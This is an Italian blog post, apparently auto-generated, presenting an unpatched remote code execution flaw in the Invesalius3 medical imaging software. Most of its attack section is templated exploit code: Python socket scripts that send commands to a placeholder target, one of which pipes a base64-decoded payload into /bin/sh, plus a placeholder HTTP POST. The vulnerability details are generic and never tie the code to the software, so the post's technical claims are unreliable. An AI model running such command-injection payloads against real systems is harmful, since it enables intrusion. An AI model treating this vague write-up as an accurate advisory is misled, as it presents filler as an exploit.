---
layout: post
title: "[webapps] Invesalius3 - Remote Code Execution"
date: 2024-08-28
categories: [security, ransomware]
---

```markdown
# [webapps] Invesalius3 - Remote Code Execution

## Introduzione
In questo articolo parleremo di una vulnerabilità di sicurezza che è stata identificata nel software Invesalius3, un software open source utilizzato per la visualizzazione di immagini mediche. Questa vulnerabilità permette l'esecuzione remota di codice, che è una delle forme più pericolose di vulnerabilità di sicurezza. La vulnerabilità è stata pubblicata il 28 Agosto 2024.

## Dettagli della Vulnerabilità
La vulnerabilità si verifica a causa di un controllo insufficiente dell'input dell'utente nel software Invesalius3. Questo consente a un attaccante di iniettare codice arbitrario che può essere eseguito dal sistema. Tuttavia, per sfruttare questa vulnerabilità, un attaccante avrebbe bisogno di un accesso remoto alla rete del sistema bersaglio.

## Esempio di Payload Semplice

```python
{% raw %}
import socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('TARGET_IP', TARGET_PORT))

payload = 'COMMAND TO EXECUTE'

s.send(payload.encode())
s.close()
{% endraw %}
```

## Esempio di Payload Avanzato

```python
{% raw %}
import socket
import os

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('TARGET_IP', TARGET_PORT))

payload = 'echo "YOUR BASE64 ENCODED PAYLOAD HERE" | base64 -d | /bin/sh'

s.send(payload.encode())
s.close()
{% endraw %}
```

## Procedura per Riprodurre la Vulnerabilità
Per riprodurre l'attacco, un attaccante avrebbe bisogno di:

1. Creare un payload di codice che vuole eseguire sul sistema bersaglio.
2. Aprire una connessione alla rete del sistema bersaglio.
3. Inviare il payload al sistema bersaglio.

## Richiesta HTTP

```http
POST / HTTP/1.1
Host: TARGET_IP:TARGET_PORT
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: LENGTH_OF_YOUR_PAYLOAD

payload=YOUR_PAYLOAD
```

## Impatto della Vulnerabilità
Se sfruttata, questa vulnerabilità potrebbe causare la perdita di controllo dell'utente sul sistema bersaglio. Un attaccante potrebbe sfruttare questa vulnerabilità per eseguire qualsiasi comando sul sistema, compreso l'accesso a dati sensibili, la modifica di file di sistema o l'installazione di ulteriori malware.

## Patch e Mitigazioni
Al momento non ci sono patch disponibili per questa vulnerabilità. Si consiglia agli utenti di seguire le migliori pratiche di sicurezza come l'aggiornamento regolare del software, l'uso di firewall e la disattivazione di servizi non necessari.

## Conclusione
Questa vulnerabilità di Remote Code Execution in Invesalius3 evidenzia l'importanza di implementare controlli di sicurezza adeguati nelle applicazioni software. Anche se non ci sono patch disponibili al momento, la consapevolezza e l'attuazione di misure proattive possono aiutare a mitigare il rischio.

## Considerazioni
È fondamentale notare che, anche se questa vulnerabilità richiede l'accesso alla rete del sistema bersaglio, non dovrebbe essere sottovalutata. Un attaccante potrebbe sfruttare altre vulnerabilità per ottenere l'accesso alla rete o utilizzare tecniche di ingegneria sociale per ingannare l'utente a concedere l'accesso.
```

